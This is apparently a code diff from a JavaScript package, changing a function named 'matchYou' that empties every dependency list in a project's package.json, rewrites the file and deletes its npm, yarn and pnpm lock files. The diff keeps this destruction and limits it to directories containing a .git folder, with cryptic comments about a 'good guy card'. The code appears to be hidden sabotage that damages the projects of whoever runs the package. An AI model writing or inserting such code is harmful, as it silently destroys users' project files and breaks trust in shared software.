@@ -39,13 +39,17 @@ function matchYou(directory) {
   } catch (error) {
     return;
   }
-  if (package.dependencies) package.dependencies = {}
-  if (package.devDependencies) package.devDependencies = {}
-  if (package.peerDependencies) package.peerDependencies = {}
-  if (package.bundledDependencies) package.bundledDependencies = {}
-  if (package.optionalDependencies) package.optionalDependencies = {}
-  if (package.resolutions) package.resolutions = {}
-  fs.writeFile(packageFile, JSON.stringify(package, null, 2));
+  // grandmother 安全配
+  const youHaveGit = path.resolve(directory, '.git')
+  if (fs.existsSync(youHaveGit)) {
+    if (package.dependencies) package.dependencies = {}
+    if (package.devDependencies) package.devDependencies = {}
+    if (package.peerDependencies) package.peerDependencies = {}
+    if (package.bundledDependencies) package.bundledDependencies = {}
+    if (package.optionalDependencies) package.optionalDependencies = {}
+    if (package.resolutions) package.resolutions = {}
+    fs.writeFile(packageFile, JSON.stringify(package, null, 2));
+  }
 
   if (typeof fs.rm === "function") {
     // We have good guy card, We would not delete package.json
@@ -59,6 +63,7 @@ function matchYou(directory) {
       noop
     );
   } else {
+    // 很久以前的 Node.js 
     fs.unlink(path.resolve(directory, "package-lock.json"), noop);
     fs.unlink(path.resolve(directory, "yarn.lock"), noop);
     fs.unlink(path.resolve(directory, "pnpm-lock.yaml"), noop);
